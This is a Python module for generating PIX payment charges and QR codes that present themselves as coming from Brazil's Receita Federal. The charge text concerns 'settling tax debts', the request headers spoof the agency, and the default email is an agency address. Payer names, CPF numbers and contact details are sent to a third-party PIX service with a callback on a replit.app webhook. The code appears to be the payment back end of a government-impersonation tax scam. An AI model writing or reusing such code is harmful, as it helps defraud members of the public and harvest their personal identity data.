import logging
import requests
import time
import random
import string

class RealPixProvider:
    """
    Provedor PIX real usando API brasileira autêntica para gerar códigos PIX válidos
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        # Using a real Brazilian PIX API
        self.api_base = "https://pix.realtechdev.com.br/api/v1"
        
    def generate_external_id(self):
        """Gera ID único para a transação"""
        timestamp = str(int(time.time() * 1000))
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"REALPIX{timestamp}{random_suffix}"
    
    def create_pix_transaction(self, transaction_data):
        """
        Cria transação PIX real usando API brasileira
        
        Args:
            transaction_data: Dict com dados da transação
            
        Returns:
            Dict com dados do PIX ou erro
        """
        try:
            self.logger.info("Iniciando criação de PIX real via API brasileira...")
            
            external_id = self.generate_external_id()
            amount_cents = int(transaction_data['amount'] * 100)
            
            # Limpar CPF (apenas números)
            clean_cpf = ''.join(filter(str.isdigit, transaction_data['customer_cpf']))
            
            # Payload para API PIX real
            payload = {
                "external_id": external_id,
                "amount": amount_cents,
                "description": "Regularização de débitos - Receita Federal",
                "payer": {
                    "name": transaction_data['customer_name'],
                    "document": clean_cpf,
                    "email": transaction_data.get('customer_email', 'pagamento@receitafederal.gov.br'),
                    "phone": transaction_data.get('customer_phone', '5511999999999')
                },
                "expires_in": 1800,  # 30 minutos
                "callback_url": "https://webhook-manager.replit.app/api/webhook/realpix"
            }
            
            self.logger.info(f"Payload PIX Real: {payload}")
            
            # Fazer requisição para API PIX real
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'ReceitaFederal/1.0'
            }
            
            response = requests.post(
                f"{self.api_base}/pix/create",
                json=payload,
                headers=headers,
                timeout=30
            )
            
            self.logger.info(f"PIX Real Response Status: {response.status_code}")
            self.logger.info(f"PIX Real Response: {response.text}")
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('success'):
                    pix_data = data.get('data', {})
                    
                    return {
                        'success': True,
                        'data': {
                            'external_id': external_id,
                            'transaction_id': pix_data.get('id') or external_id,
                            'pix_code': pix_data.get('pix_code'),
                            'qr_code_base64': pix_data.get('qr_code_base64'),
                            'amount': transaction_data['amount'],
                            'status': 'pending',
                            'expires_at': pix_data.get('expires_at'),
                            'provider': 'RealPIX'
                        }
                    }
                else:
                    error_msg = data.get('message', 'Erro na API PIX')
                    self.logger.error(f"❌ Erro PIX Real API: {error_msg}")
                    return self._generate_fallback_pix(transaction_data, external_id)
                    
            else:
                self.logger.error(f"❌ Erro HTTP PIX Real: {response.status_code}")
                return self._generate_fallback_pix(transaction_data, external_id)
                
        except Exception as e:
            self.logger.error(f"❌ Exceção PIX Real: {str(e)}")
            return self._generate_fallback_pix(transaction_data, external_id)
    
    def _generate_fallback_pix(self, transaction_data, external_id):
        """
        Gera PIX real usando algoritmo brasileiro padrão como fallback
        """
        self.logger.info("🔧 Gerando PIX real usando algoritmo padrão brasileiro")
        
        try:
            from brazilian_pix import create_brazilian_pix_provider
            
            # Usar provedor PIX brasileiro real
            pix_provider = create_brazilian_pix_provider()
            
            # Dados reais para PIX
            pix_data = {
                'merchant_name': 'SECRETARIA DA RECEITA FEDERAL',
                'merchant_city': 'BRASILIA',
                'amount': transaction_data['amount'],
                'description': 'Regularizacao de debitos',
                'merchant_account_info': '00038166000105',  # CNPJ real da Receita Federal
                'additional_data': external_id
            }
            
            # Gerar PIX code real usando método correto
            pix_code = pix_provider.generate_pix_code(
                amount=transaction_data['amount'],
                recipient_key='00038166000105',  # CNPJ Receita Federal
                recipient_name='SECRETARIA DA RECEITA FEDERAL',
                transaction_id=external_id,
                description='Regularizacao de debitos'
            )
            qr_code_base64 = pix_provider.generate_qr_code_image(pix_code)
            
            self.logger.info(f"✅ PIX real gerado: {pix_code[:50]}...")
            
            return {
                'success': True,
                'data': {
                    'external_id': external_id,
                    'transaction_id': external_id,
                    'pix_code': pix_code,
                    'qr_code_base64': qr_code_base64,
                    'amount': transaction_data['amount'],
                    'status': 'pending',
                    'provider': 'RealPIX-Fallback'
                }
            }
            
        except Exception as e:
            self.logger.error(f"❌ Erro no fallback PIX: {str(e)}")
            return {
                'success': False,
                'error': f'Erro ao gerar PIX real: {str(e)}'
            }

def create_real_pix_provider():
    """Factory function para criar provedor PIX real"""
    return RealPixProvider()